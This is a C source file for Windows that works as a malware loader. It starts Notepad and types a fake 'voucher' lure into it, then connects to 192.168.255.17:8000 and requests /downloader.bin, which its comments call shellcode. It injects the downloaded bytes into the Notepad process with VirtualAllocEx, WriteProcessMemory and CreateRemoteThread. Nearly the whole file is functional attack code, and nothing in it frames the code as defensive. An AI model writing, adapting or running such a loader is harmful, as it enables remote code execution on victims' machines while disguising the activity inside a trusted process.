#include <ws2tcpip.h>
#include <winsock2.h>
#include <winsock.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>


#pragma comment(lib, "ws2_32.lib")


	
//GET DATA FROM AN INTERNET LOCATION

//INITIALIZE WSA VARIABLES
int main() 
{
	
	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	long int PID;
  
	if (!CreateProcessW(
	  L"C:\\Windows\\System32\\notepad.exe",
	  NULL,
	  NULL,
	  NULL,
	  FALSE,
	  BELOW_NORMAL_PRIORITY_CLASS,
	  NULL,
	  NULL,
	  &si,
	  &pi
	))
	  {
		  printf("(-) Failed to create process, error: %ld", GetLastError());
		  return EXIT_FAILURE;
	  }
	  
	  PID = pi.dwProcessId;
	  printf("(+) Process Started! pid: %ld", PID);
	  
	Sleep(1000);
	
	
	 // Find the Notepad window
    HWND hwnd = FindWindow("Notepad", NULL);

    // Find the edit control inside Notepad
    HWND hwndEdit = FindWindowEx(hwnd, NULL, "Edit", NULL);

    // Send text to Notepad
    const char *text = "Your Voucher Number is: SHOULDNOTHAVECLICKEDIT";
    for (const char *p = text; *p; ++p) {
        SendMessage(hwndEdit, WM_CHAR, (WPARAM)*p, 0);
    }
	
    WORD wVersionRequested = MAKEWORD(2, 2);
    WSADATA wsadata;
    int wsa_startup;

    wsa_startup = WSAStartup(wVersionRequested, &wsadata);

		//CHECK FOR INITIALIZATION SUCCESS - FAILURE
		if (wsa_startup != 0)
		{
			printf("WSA Startup failed with error: %d\n", wsa_startup);
			return 0;
		}
		else {
			printf("No error\n");
		}


		//CREATE A SOCKET
		SOCKET victimsocket = INVALID_SOCKET;
		victimsocket = socket(AF_INET, SOCK_STREAM, 0);
		
		if (victimsocket == -1) {
			printf("Socket establishment failed \n");
		}
		else {
			printf("Socket established \n");
		}
	
	//CONNECT TO THE SOCKET
    struct sockaddr_in {
		short sin_family;
		u_short sin_port;
		u_long sin_addr;
		char sin_zero[8];
		};
	
    struct sockaddr_in server_address;
	memset(&server_address, 0, sizeof(server_address)); //initialize the address to zerods
    server_address.sin_family = AF_INET;
    server_address.sin_addr = inet_addr("192.168.255.17");
    server_address.sin_port = htons(8000);

		int victimconnect = connect(victimsocket, (struct sockaddr*)&server_address, sizeof(struct sockaddr_in));
		if (victimconnect == SOCKET_ERROR) {
			closesocket(victimsocket);
			victimsocket = INVALID_SOCKET;
		}

    //SEND DATA TO SERVER REQUESTING FOR SHELLCODE
    char *message = "GET /downloader.bin HTTP/1.1\r\nHost: 192.168.255.17\r\n\r\n";
	printf ("%s", message);
    int victimsend = send(victimsocket, message, strlen(message), 0);
		if (victimsend == -1){
			printf("send() call failed");
		}
		else { 
			printf("\nBytes Sent %d\n\n", victimsend);
			}
			shutdown(victimsocket, SD_SEND);		
		
	

    //RECIEVE DATA FROM SERVER I.E SHELLCODE
    char data[86870];
	int recv_byte;
	
	do {
    recv_byte = recv(victimsocket, (char*)data, sizeof(data), 0);
	printf("bytes recv %d\n", recv_byte);
	//if (recv_byte == -1) {
	//	printf("recv() call failed\n");
	//	}
		
				if (recv_byte > 0) {
					printf("Data is:  %s \n", data);
				}
				if (recv_byte > 204){
					HANDLE targetProcessThread;

					//handle that stores remote process handle
					HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID);
					
					//allocate memory in remote process
					void* exec_mem = VirtualAllocEx(targetProcessHandle, NULL, recv_byte, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

					//Write buff to exe mem region
					WriteProcessMemory(targetProcessHandle, exec_mem, data, recv_byte, NULL);

					//creates a thread that executes in exec_mem region
					targetProcessThread = CreateRemoteThread(targetProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0);

					//Close the handle
					CloseHandle(targetProcessHandle); 
				}
				else if (recv_byte == 0) {
					printf("completed");
				}
				else {
					printf("GOOD BYE");
				}
			} while (recv_byte > 0);

			closesocket(victimsocket);
			return 0;
		}
    //LOOP UNTILL ALL DATA IS TRANSFERRED OR PEER CLOSES THE CONNECTION
    //PRINT THE OUTPUT FOR VERIFICATION
      
